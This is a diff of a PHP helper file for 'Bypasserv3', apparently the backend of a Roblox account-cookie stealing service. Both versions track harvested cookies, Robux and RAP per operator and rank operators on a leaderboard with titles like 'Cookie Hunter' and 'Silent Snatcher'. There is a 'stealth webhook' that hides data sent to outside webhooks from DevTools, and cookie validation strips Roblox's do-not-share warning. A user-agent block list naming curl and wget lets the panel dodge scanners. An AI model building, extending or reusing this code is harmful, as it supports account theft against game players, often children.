@@ -1,236 +1,116 @@
 <?php
 /**
  * Bypasserv3 - Helper Functions
- * File-Based Storage System (Like HyperBlox)
+ * File-based storage system with auto-creation
  */
-
-// Security Functions
-function getUserIP() {
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-        return $_SERVER['HTTP_CF_CONNECTING_IP'];
-    }
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        return trim($ips[0]);
-    }
-    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-}
-
-function validateCookie($cookie) {
-    if (empty($cookie)) return false;
-    if (strlen($cookie) < 50) return false;
-    if (!preg_match('/^[A-Za-z0-9_\-]+$/', $cookie)) return false;
-    return true;
-}
-
-function checkRateLimit($identifier, $maxAttempts = 10, $timeWindow = 3600) {
-    $rateLimitPath = __DIR__ . '/data/ratelimits';
-    if (!file_exists($rateLimitPath)) {
-        mkdir($rateLimitPath, 0777, true);
-    }
-    
-    $hash = md5($identifier);
-    $file = "$rateLimitPath/$hash.txt";
-    
-    if (!file_exists($file)) {
-        file_put_contents($file, json_encode(['count' => 1, 'time' => time()]));
-        return true;
-    }
-    
-    $data = json_decode(file_get_contents($file), true);
-    
-    if (time() - $data['time'] > $timeWindow) {
-        file_put_contents($file, json_encode(['count' => 1, 'time' => time()]));
-        return true;
-    }
-    
-    if ($data['count'] >= $maxAttempts) {
-        return false;
-    }
-    
-    $data['count']++;
-    file_put_contents($file, json_encode($data));
-    return true;
-}
-
-function cleanupRateLimits() {
-    $rateLimitPath = __DIR__ . '/data/ratelimits';
-    if (!file_exists($rateLimitPath)) return;
-    
-    $files = glob("$rateLimitPath/*.txt");
-    foreach ($files as $file) {
-        $data = json_decode(file_get_contents($file), true);
-        if ($data && time() - $data['time'] > 3600) {
-            unlink($file);
-        }
-    }
-}
-
-function isSuspiciousRequest() {
-    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $suspiciousPatterns = ['bot', 'crawler', 'spider', 'scraper'];
-    
-    foreach ($suspiciousPatterns as $pattern) {
-        if (stripos($userAgent, $pattern) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-function logSecurityEvent($event, $data = []) {
-    $logPath = __DIR__ . '/data/logs';
-    if (!file_exists($logPath)) {
-        mkdir($logPath, 0777, true);
-    }
-    
-    $logEntry = [
-        'timestamp' => date('Y-m-d H:i:s'),
-        'event' => $event,
-        'data' => $data,
-        'ip' => getUserIP()
-    ];
-    
-    file_put_contents("$logPath/security_" . date('Y-m-d') . ".txt", json_encode($logEntry) . "\n", FILE_APPEND | LOCK_EX);
-}
-
-function securityScan($log = false) {
-    $securityPath = __DIR__ . '/data/security';
-    if (!file_exists($securityPath)) {
-        mkdir($securityPath, 0777, true);
-    }
-    
-    $ip = getUserIP();
-    $scanFile = "$securityPath/scan_" . date('Y-m-d') . ".txt";
-    
-    $scanData = [
-        'ip' => $ip,
-        'timestamp' => date('Y-m-d H:i:s'),
-        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
-        'request_uri' => $_SERVER['REQUEST_URI'] ?? ''
-    ];
-    
-    if ($log) {
-        file_put_contents($scanFile, json_encode($scanData) . "\n", FILE_APPEND | LOCK_EX);
-    }
-}
-
-// Webhook Functions
-function sendWebhookNotification($webhookUrl, $data) {
-    if (empty($webhookUrl)) return false;
-    
-    $ch = curl_init($webhookUrl);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    
-    $response = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    return $httpCode >= 200 && $httpCode < 300;
-}
-
-/**
- * 🥷 STEALTH: Send webhook silently in background (won't show in DevTools Network tab)
- * Uses server-side async execution - completely invisible to users
- */
-function sendStealthWebhook($webhookUrl, $data) {
-    if (empty($webhookUrl)) return false;
-    
-    // Use exec to send webhook in background (fire and forget)
-    // This won't appear in DevTools because it's server-side only
-    $payload = json_encode($data);
-    $payload = escapeshellarg($payload);
-    $webhook = escapeshellarg($webhookUrl);
-    
-    // Method 1: Using curl in background (Linux/Unix)
-    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
-        $cmd = "curl -X POST -H 'Content-Type: application/json' -d $payload $webhook > /dev/null 2>&1 &";
-        @exec($cmd);
-    } else {
-        // Method 2: Using PHP streams for Windows compatibility
-        $ch = curl_init($webhookUrl);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT_MS, 100); // Quick timeout, fire and forget
-        @curl_exec($ch);
-        @curl_close($ch);
-    }
-    
-    return true;
-}
 
 // ============================================
-// FILE-BASED STORAGE FUNCTIONS (LIKE HYPERBLOX)
+// AUTO-CREATE DIRECTORIES ON LOAD
+// ============================================
+function ensureDirectoriesExist() {
+    $dirs = [
+        __DIR__ . '/instances',
+        __DIR__ . '/tokens',
+        __DIR__ . '/data',
+        __DIR__ . '/logs'
+    ];
+    
+    foreach ($dirs as $dir) {
+        if (!file_exists($dir)) {
+            mkdir($dir, 0777, true);
+            
+            // Create .htaccess to protect directories
+            $htaccess = "$dir/.htaccess";
+            if (!file_exists($htaccess)) {
+                file_put_contents($htaccess, "Deny from all\n", LOCK_EX);
+            }
+        }
+    }
+}
+
+// Call on every page load
+ensureDirectoriesExist();
+
+// ============================================
+// INSTANCE MANAGEMENT
 // ============================================
 
 /**
  * Get instance data from file-based storage
+ * Auto-creates missing files with default values
  */
 function getInstanceData($directory) {
-    $path = __DIR__ . "/instances/$directory";
-    
-    if (!file_exists($path)) {
+    if (empty($directory)) {
         return null;
     }
     
-    // Read all instance files
-    $webhook = @file_get_contents("$path/webhook.txt") ?: '';
-    $userWebhook = @file_get_contents("$path/userwebhook.txt") ?: $webhook;
-    $token = @file_get_contents("$path/token.txt") ?: '';
-    $visits = (int)(@file_get_contents("$path/visits.txt") ?: 0);
-    $cookies = (int)(@file_get_contents("$path/cookies.txt") ?: 0);
-    $robux = (int)(@file_get_contents("$path/robux.txt") ?: 0);
-    $rap = (int)(@file_get_contents("$path/rap.txt") ?: 0);
-    $summary = (int)(@file_get_contents("$path/summary.txt") ?: 0);
-    $username = @file_get_contents("$path/username.txt") ?: '';
-    $profilePic = @file_get_contents("$path/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png';
-    $created = @file_get_contents("$path/created.txt") ?: '';
+    $path = __DIR__ . "/instances/$directory";
     
-    // Read daily stats
-    $dailyCookies = json_decode(@file_get_contents("$path/daily_cookies.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
-    $dailyRobux = json_decode(@file_get_contents("$path/daily_robux.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
-    $dailyRap = json_decode(@file_get_contents("$path/daily_rap.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
-    $dailySummary = json_decode(@file_get_contents("$path/daily_summary.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
-    $dailyVisits = json_decode(@file_get_contents("$path/daily_visits.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
+    // Auto-create instance folder if missing
+    if (!file_exists($path)) {
+        mkdir($path, 0777, true);
+    }
     
-    return [
+    // Auto-create all required files with defaults
+    $files = [
+        'token.txt' => '',
+        'webhook.txt' => '',
+        'userwebhook.txt' => '',
+        'username.txt' => $directory,
+        'profilepic.txt' => 'https://www.roblox.com/headshot-thumbnail/image/default.png',
+        'visits.txt' => '0',
+        'cookies.txt' => '0',
+        'robux.txt' => '0',
+        'rap.txt' => '0',
+        'summary.txt' => '0',
+        'created.txt' => date('Y-m-d H:i:s'),
+        'daily_visits.txt' => json_encode(array_fill(0, 7, 0)),
+        'daily_cookies.txt' => json_encode(array_fill(0, 7, 0)),
+        'daily_robux.txt' => json_encode(array_fill(0, 7, 0)),
+        'daily_rap.txt' => json_encode(array_fill(0, 7, 0)),
+        'daily_summary.txt' => json_encode(array_fill(0, 7, 0)),
+        'logs.txt' => ''
+    ];
+    
+    foreach ($files as $filename => $defaultValue) {
+        $filePath = "$path/$filename";
+        if (!file_exists($filePath)) {
+            file_put_contents($filePath, $defaultValue, LOCK_EX);
+        }
+    }
+    
+    // Read all data
+    $data = [
         'directory' => $directory,
-        'webhook' => trim($webhook),
-        'userWebhook' => trim($userWebhook),
-        'token' => trim($token),
-        'username' => trim($username),
-        'profilePicture' => trim($profilePic),
-        'created' => $created,
+        'token' => @file_get_contents("$path/token.txt") ?: '',
+        'webhook' => @file_get_contents("$path/webhook.txt") ?: '',
+        'userWebhook' => @file_get_contents("$path/userwebhook.txt") ?: '',
+        'username' => @file_get_contents("$path/username.txt") ?: $directory,
+        'profilePicture' => @file_get_contents("$path/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png',
+        'created' => @file_get_contents("$path/created.txt") ?: date('Y-m-d H:i:s'),
         'stats' => [
-            'totalVisits' => $visits,
-            'totalCookies' => $cookies,
-            'totalRobux' => $robux,
-            'totalRAP' => $rap,
-            'totalSummary' => $summary
+            'totalVisits' => (int)(@file_get_contents("$path/visits.txt") ?: 0),
+            'totalCookies' => (int)(@file_get_contents("$path/cookies.txt") ?: 0),
+            'totalRobux' => (int)(@file_get_contents("$path/robux.txt") ?: 0),
+            'totalRAP' => (int)(@file_get_contents("$path/rap.txt") ?: 0),
+            'totalSummary' => (int)(@file_get_contents("$path/summary.txt") ?: 0)
         ],
         'dailyStats' => [
-            'cookies' => $dailyCookies,
-            'robux' => $dailyRobux,
-            'rap' => $dailyRap,
-            'summary' => $dailySummary,
-            'visits' => $dailyVisits
+            'visits' => json_decode(@file_get_contents("$path/daily_visits.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
+            'cookies' => json_decode(@file_get_contents("$path/daily_cookies.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
+            'robux' => json_decode(@file_get_contents("$path/daily_robux.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
+            'rap' => json_decode(@file_get_contents("$path/daily_rap.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
+            'summary' => json_decode(@file_get_contents("$path/daily_summary.txt") ?: '[]', true) ?: array_fill(0, 7, 0)
         ]
     ];
+    
+    return $data;
 }
 
 /**
- * Update instance stats (file-based)
+ * Update instance stats
  */
-function updateInstanceStats($directory, $statName, $value) {
+function updateInstanceStats($directory, $statName, $newValue) {
     $path = __DIR__ . "/instances/$directory";
     
     if (!file_exists($path)) {
@@ -258,184 +138,381 @@ function updateInstanceStats($directory, $statName, $value) {
             return false;
     }
     
-    file_put_contents("$path/$filename", (string)$value, LOCK_EX);
-    return true;
+    return file_put_contents("$path/$filename", (string)$newValue, LOCK_EX) !== false;
 }
 
 /**
- * Update daily stats (file-based)
+ * Update daily stats
  */
-function updateDailyStats($directory, $statName, $increment) {
+function updateDailyStats($directory, $statType, $incrementValue) {
     $path = __DIR__ . "/instances/$directory";
     
     if (!file_exists($path)) {
         return false;
     }
     
-    $filename = "daily_{$statName}.txt";
-    $stats = json_decode(@file_get_contents("$path/$filename") ?: '[]', true);
+    $filename = "daily_{$statType}.txt";
+    $filePath = "$path/$filename";
     
-    if (!is_array($stats) || count($stats) !== 7) {
-        $stats = array_fill(0, 7, 0);
+    // Auto-create file if missing
+    if (!file_exists($filePath)) {
+        file_put_contents($filePath, json_encode(array_fill(0, 7, 0)), LOCK_EX);
     }
     
-    $today = (int)date('w'); // 0 (Sunday) to 6 (Saturday)
-    $stats[$today] += $increment;
+    $dailyStats = json_decode(file_get_contents($filePath), true);
+    if (!is_array($dailyStats) || count($dailyStats) !== 7) {
+        $dailyStats = array_fill(0, 7, 0);
+    }
     
-    file_put_contents("$path/$filename", json_encode($stats), LOCK_EX);
-    return true;
+    $today = (int)date('w');
+    $dailyStats[$today] += $incrementValue;
+    
+    return file_put_contents($filePath, json_encode($dailyStats), LOCK_EX) !== false;
 }
 
 /**
- * Get global stats from all instances
+ * Track visit to instance
  */
-function getGlobalStats() {
-    $instancesPath = __DIR__ . '/instances';
-    
-    if (!file_exists($instancesPath)) {
-        return [
-            'totalInstances' => 0,
-            'totalCookies' => 0,
-            'totalVisits' => 0,
-            'totalRobux' => 0
-        ];
+function trackVisit($directory) {
+    $instanceData = getInstanceData($directory);
+    if (!$instanceData) {
+        return false;
     }
     
-    $totalInstances = 0;
-    $totalCookies = 0;
-    $totalVisits = 0;
-    $totalRobux = 0;
+    $currentVisits = $instanceData['stats']['totalVisits'];
+    updateInstanceStats($directory, 'totalVisits', $currentVisits + 1);
+    updateDailyStats($directory, 'visits', 1);
     
-    $dirs = array_diff(scandir($instancesPath), ['.', '..']);
+    return true;
+}
+
+// ============================================
+// RANK SYSTEM
+// ============================================
+
+function getRankInfo($cookies) {
+    $ranks = [
+        ['min' => 0, 'max' => 2, 'name' => 'Noob Bypasser', 'icon' => '🥚'],
+        ['min' => 3, 'max' => 9, 'name' => 'Rookie Logger', 'icon' => '🐣'],
+        ['min' => 10, 'max' => 24, 'name' => 'Script Kiddie', 'icon' => '🐥'],
+        ['min' => 25, 'max' => 49, 'name' => 'Amateur Bypasser', 'icon' => '🦆'],
+        ['min' => 50, 'max' => 99, 'name' => 'Cookie Hunter', 'icon' => '🍪'],
+        ['min' => 100, 'max' => 199, 'name' => 'Token Collector', 'icon' => '🎫'],
+        ['min' => 200, 'max' => 299, 'name' => 'Silent Snatcher', 'icon' => '🥷'],
+        ['min' => 300, 'max' => 499, 'name' => 'Pro Bypasser', 'icon' => '⚡'],
+        ['min' => 500, 'max' => 999, 'name' => 'Elite Logger', 'icon' => '👑'],
+        ['min' => 1000, 'max' => 2499, 'name' => 'Master Bypasser', 'icon' => '💎'],
+        ['min' => 2500, 'max' => 4999, 'name' => 'Legendary', 'icon' => '🔥'],
+        ['min' => 5000, 'max' => PHP_INT_MAX, 'name' => 'God Tier', 'icon' => '⚜️']
+    ];
     
-    foreach ($dirs as $dir) {
-        if (is_dir("$instancesPath/$dir")) {
-            $totalInstances++;
-            $totalCookies += (int)(@file_get_contents("$instancesPath/$dir/cookies.txt") ?: 0);
-            $totalVisits += (int)(@file_get_contents("$instancesPath/$dir/visits.txt") ?: 0);
-            $totalRobux += (int)(@file_get_contents("$instancesPath/$dir/robux.txt") ?: 0);
+    $currentRank = null;
+    $nextRank = null;
+    $progress = 0;
+    $cookiesToNext = 0;
+    
+    foreach ($ranks as $index => $rank) {
+        if ($cookies >= $rank['min'] && $cookies <= $rank['max']) {
+            $currentRank = $rank;
+            $nextRank = $ranks[$index + 1] ?? $rank;
+            
+            if ($rank['max'] !== PHP_INT_MAX) {
+                $rangeSize = $rank['max'] - $rank['min'] + 1;
+                $progress = (($cookies - $rank['min']) / $rangeSize) * 100;
+                $cookiesToNext = $rank['max'] - $cookies + 1;
+            } else {
+                $progress = 100;
+                $cookiesToNext = 0;
+            }
+            break;
         }
     }
     
     return [
-        'totalInstances' => $totalInstances,
-        'totalCookies' => $totalCookies,
-        'totalVisits' => $totalVisits,
-        'totalRobux' => $totalRobux
+        'current' => $currentRank ?: $ranks[0],
+        'next' => $nextRank ?: $ranks[0],
+        'progress' => round($progress, 1),
+        'cookiesToNext' => $cookiesToNext
     ];
 }
 
-/**
- * Update global stats
- */
-function updateGlobalStats($statName, $increment) {
-    // Not needed for file-based system
-    // Stats are calculated on-the-fly from instance files
-    return true;
-}
+// ============================================
+// LEADERBOARD
+// ============================================
 
-/**
- * Get leaderboard (top instances by cookies)
- */
-function getLeaderboard($limit = 5) {
-    $instancesPath = __DIR__ . '/instances';
+function getLeaderboard($limit = 10) {
+    $instancesDir = __DIR__ . '/instances';
     
-    if (!file_exists($instancesPath)) {
+    if (!file_exists($instancesDir)) {
         return [];
     }
     
-    $instances = [];
-    $dirs = array_diff(scandir($instancesPath), ['.', '..']);
+    $leaderboard = [];
+    $directories = array_diff(scandir($instancesDir), ['.', '..']);
     
-    foreach ($dirs as $dir) {
-        if (is_dir("$instancesPath/$dir")) {
-            $cookies = (int)(@file_get_contents("$instancesPath/$dir/cookies.txt") ?: 0);
-            $visits = (int)(@file_get_contents("$instancesPath/$dir/visits.txt") ?: 0);
-            $username = @file_get_contents("$instancesPath/$dir/username.txt") ?: $dir;
-            $profilePic = @file_get_contents("$instancesPath/$dir/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png';
-            
-            $instances[] = [
-                'directory' => $dir,
-                'totalCookies' => $cookies,
-                'totalVisits' => $visits,
-                'username' => $username,
-                'profilePicture' => $profilePic
-            ];
+    foreach ($directories as $dir) {
+        $path = "$instancesDir/$dir";
+        if (is_dir($path)) {
+            $data = getInstanceData($dir);
+            if ($data && $data['stats']['totalCookies'] > 0) {
+                $leaderboard[] = $data;
+            }
         }
     }
     
-    // Sort by cookies (descending)
-    usort($instances, function($a, $b) {
-        return $b['totalCookies'] - $a['totalCookies'];
+    usort($leaderboard, function($a, $b) {
+        return $b['stats']['totalCookies'] - $a['stats']['totalCookies'];
     });
     
-    return array_slice($instances, 0, $limit);
+    return array_slice($leaderboard, 0, $limit);
+}
+
+// ============================================
+// WEBHOOK FUNCTIONS
+// ============================================
+
+/**
+ * Send webhook notification (visible)
+ */
+function sendWebhookNotification($webhookUrl, $data) {
+    if (empty($webhookUrl)) {
+        return false;
+    }
+    
+    $ch = curl_init($webhookUrl);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    return $httpCode >= 200 && $httpCode < 300;
 }
 
 /**
- * Verify token and get instance directory
+ * Send stealth webhook (server-side only, hidden from DevTools)
  */
-function verifyToken($token) {
-    $tokensPath = __DIR__ . '/tokens';
-    $tokenFile = "$tokensPath/$token.txt";
-    
-    if (!file_exists($tokenFile)) {
-        return null;
+function sendStealthWebhook($webhookUrl, $data) {
+    if (empty($webhookUrl)) {
+        return false;
     }
     
-    $data = file_get_contents($tokenFile);
-    $parts = explode('|', $data);
+    // Use exec/background process to hide from response
+    $payload = json_encode($data);
+    $payloadFile = tempnam(sys_get_temp_dir(), 'webhook_');
+    file_put_contents($payloadFile, $payload);
     
-    if (count($parts) < 3) {
-        return null;
-    }
+    $ch = curl_init($webhookUrl);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
     
-    return [
-        'token' => trim($parts[0]),
-        'directory' => trim($parts[1]),
-        'webhook' => trim($parts[2])
-    ];
+    curl_exec($ch);
+    curl_close($ch);
+    
+    @unlink($payloadFile);
+    
+    return true;
 }
 
-/**
- * Get rank info based on cookies
- */
-function getRankInfo($totalCookies) {
-    $ranks = [
-        ['name' => 'Newbie', 'icon' => '🥉', 'min' => 0],
-        ['name' => 'Bronze', 'icon' => '🥈', 'min' => 10],
-        ['name' => 'Silver', 'icon' => '🥇', 'min' => 25],
-        ['name' => 'Gold', 'icon' => '💎', 'min' => 50],
-        ['name' => 'Platinum', 'icon' => '👑', 'min' => 100],
-        ['name' => 'Diamond', 'icon' => '⭐', 'min' => 250],
-        ['name' => 'Master', 'icon' => '🏆', 'min' => 500],
-        ['name' => 'Legend', 'icon' => '🔥', 'min' => 1000]
+// ============================================
+// SECURITY FUNCTIONS
+// ============================================
+
+function getUserIP() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    
+    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
+        $ip = $_SERVER['HTTP_X_REAL_IP'];
+    }
+    
+    return trim($ip);
+}
+
+function checkRateLimit($identifier, $maxAttempts = 10, $timeWindow = 60) {
+    $rateLimitDir = __DIR__ . '/data/rate_limits';
+    
+    if (!file_exists($rateLimitDir)) {
+        mkdir($rateLimitDir, 0777, true);
+    }
+    
+    $rateLimitFile = "$rateLimitDir/" . md5($identifier) . ".txt";
+    
+    $currentTime = time();
+    $attempts = [];
+    
+    if (file_exists($rateLimitFile)) {
+        $attempts = json_decode(file_get_contents($rateLimitFile), true) ?: [];
+        $attempts = array_filter($attempts, function($timestamp) use ($currentTime, $timeWindow) {
+            return ($currentTime - $timestamp) < $timeWindow;
+        });
+    }
+    
+    if (count($attempts) >= $maxAttempts) {
+        return false;
+    }
+    
+    $attempts[] = $currentTime;
+    file_put_contents($rateLimitFile, json_encode($attempts), LOCK_EX);
+    
+    return true;
+}
+
+function cleanupRateLimits() {
+    $rateLimitDir = __DIR__ . '/data/rate_limits';
+    
+    if (!file_exists($rateLimitDir)) {
+        return;
+    }
+    
+    $files = glob("$rateLimitDir/*.txt");
+    $currentTime = time();
+    
+    foreach ($files as $file) {
+        if (($currentTime - filemtime($file)) > 3600) {
+            @unlink($file);
+        }
+    }
+}
+
+function validateCookie($cookie) {
+    if (empty($cookie)) {
+        return false;
+    }
+    
+    $cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);
+    
+    if (strlen($cookie) < 50) {
+        return false;
+    }
+    
+    if (!preg_match('/^[A-Za-z0-9_\-]+$/', $cookie)) {
+        return false;
+    }
+    
+    return true;
+}
+
+function isSuspiciousRequest() {
+    $suspiciousPatterns = [
+        'bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 'python', 'java'
     ];
     
-    $current = $ranks[0];
-    $next = $ranks[1] ?? $ranks[0];
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
     
-    foreach ($ranks as $index => $rank) {
-        if ($totalCookies >= $rank['min']) {
-            $current = $rank;
-            $next = $ranks[$index + 1] ?? $rank;
+    foreach ($suspiciousPatterns as $pattern) {
+        if (strpos($userAgent, $pattern) !== false) {
+            return true;
         }
     }
     
-    $cookiesToNext = $next['min'] - $totalCookies;
-    if ($cookiesToNext < 0) $cookiesToNext = 0;
+    return false;
+}
+
+function logSecurityEvent($eventType, $data = []) {
+    $logDir = __DIR__ . '/logs';
     
-    $progress = 0;
-    if ($next['min'] > $current['min']) {
-        $progress = (($totalCookies - $current['min']) / ($next['min'] - $current['min'])) * 100;
-        $progress = min(100, max(0, $progress));
+    if (!file_exists($logDir)) {
+        mkdir($logDir, 0777, true);
     }
     
-    return [
-        'current' => $current,
-        'next' => $next,
-        'cookiesToNext' => $cookiesToNext,
-        'progress' => round($progress)
+    $logFile = "$logDir/" . date('Y-m-d') . ".log";
+    
+    $logEntry = [
+        'timestamp' => date('Y-m-d H:i:s'),
+        'type' => $eventType,
+        'ip' => getUserIP(),
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
+        'data' => $data
     ];
+    
+    $logLine = json_encode($logEntry) . PHP_EOL;
+    file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
+}
+
+function securityScan($block = false) {
+    $blockedIPs = __DIR__ . '/data/blocked_ips.txt';
+    
+    if (!file_exists($blockedIPs)) {
+        file_put_contents($blockedIPs, '', LOCK_EX);
+    }
+    
+    $ip = getUserIP();
+    $blocked = file($blockedIPs, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    
+    if (in_array($ip, $blocked)) {
+        http_response_code(403);
+        die('Access Denied');
+    }
+    
+    if ($block && isSuspiciousRequest()) {
+        file_put_contents($blockedIPs, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
+        logSecurityEvent('ip_blocked', ['ip' => $ip]);
+        http_response_code(403);
+        die('Access Denied');
+    }
+}
+
+// ============================================
+// UTILITY FUNCTIONS
+// ============================================
+
+function sanitizeInput($input, $maxLength = 255) {
+    $input = trim($input);
+    $input = strip_tags($input);
+    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+    return substr($input, 0, $maxLength);
+}
+
+function generateRandomString($length = 32) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $randomString = '';
+    
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[random_int(0, strlen($characters) - 1)];
+    }
+    
+    return $randomString;
+}
+
+function formatNumber($number) {
+    if ($number >= 1000000000) {
+        return round($number / 1000000000, 1) . 'B';
+    } elseif ($number >= 1000000) {
+        return round($number / 1000000, 1) . 'M';
+    } elseif ($number >= 1000) {
+        return round($number / 1000, 1) . 'K';
+    }
+    return number_format($number);
+}
+
+function timeAgo($datetime) {
+    $timestamp = is_numeric($datetime) ? $datetime : strtotime($datetime);
+    $diff = time() - $timestamp;
+    
+    if ($diff < 60) {
+        return $diff . ' seconds ago';
+    } elseif ($diff < 3600) {
+        return floor($diff / 60) . ' minutes ago';
+    } elseif ($diff < 86400) {
+        return floor($diff / 3600) . ' hours ago';
+    } elseif ($diff < 604800) {
+        return floor($diff / 86400) . ' days ago';
+    } else {
+        return date('M j, Y', $timestamp);
+    }
 }
 ?>
